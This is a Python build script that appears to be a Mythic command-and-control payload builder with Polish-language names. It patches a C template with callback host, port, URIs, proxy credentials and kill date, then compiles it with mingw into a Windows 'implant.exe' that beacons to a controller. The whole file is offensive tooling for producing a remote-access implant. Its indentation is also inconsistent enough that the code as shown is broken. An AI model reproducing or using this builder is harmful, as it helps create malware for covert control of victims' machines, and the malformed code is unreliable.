from mythic_container.PayloadBuilder import *
import os

async def sparsuj_i_skompiluj(self) -> BuildResponse:
	params = self.c2info[0].get_parameters_dict()
	
		with open("src/main.c","r") as f:
			code = f.read()
		resp = BuildResponse(status=BuildStatus.Success)
		code = code.replace("REPLACE_ME_HOST", params["callback_host"])
		code = code.replace("REPLACE_ME_UUID",self.uuid)
   		code = code.replace("REPLACE_ME_PORT", str(params["callback_port"]))
   		code = code.replace("REPLACE_ME_INTERVAL", str(params["callback_interval"]))
   		code = code.replace("REPLACE_ME_JITTER", str(params["callback_jitter"]))
   		code = code.replace("REPLACE_ME_GET_URI", params["get_uri"])
   		code = code.replace("REPLACE_ME_POST_URI", params["post_uri"])
   		code = code.replace("REPLACE_ME_QUERY_PATH_NAME", params["query_path_name"])
   		code = code.replace("REPLACE_ME_EEC", "1" if params["encrypted_exchange_check"] else "0")
   		code = code.replace("REPLACE_ME_PROXY_HOST", params.get("proxy_host", ""))
   		code = code.replace("REPLACE_ME_PROXY_PORT", params.get("proxy_port", ""))
   		code = code.replace("REPLACE_ME_PROXY_USER", params.get("proxy_user", ""))
   		code = code.replace("REPLACE_ME_PROXY_PASS", params.get("proxy_pass", ""))
   		code = code.replace("REPLACE_ME_KILLDATE", str(params["killdate"]))
   		with open("bin/patched.c", "w") as p:
   			p.write(code)
   		output_file = "bin/implant.exe"
   		cmd = f"x86_64-w64-mingw32-gcc bin/patched.c -o bin/implant.exe -lws2_32 -lwininet"
   		result = os.system(cmd)
   		if result == 0:
   			with open("bin/implant.exe","rb") as b:
   				resp.payload = b.read()
   		else:
   			resp.status = BuildStatus.Error
   			resp.build_message = "kompilacja dostala wylewu"
		return resp









	# c2_url = params["callback_host"]
	# c2_port = params["callback_port"]
	# c2_EEC = params["encrypted_exchange_check"]
	# c2_jitter = params["callback_jitter"]
	# c2_get_uri = params["get_uri"]
	# c2_post_uri = params["post_uri"]
	# c2_query_path_name = params["query_path_name"]
	# c2_proxy_host = params.get("proxy_host", "") 
	# c2_proxy_port = params.get("proxy_port", "")
	# c2_proxy_user = params.get("proxy_user", "")
	# c2_proxy_pass = params.get("proxy_pass", "")
	# c2_callback_interval = params["callback_interval"]
	# c2_killdate = params["killdate"] 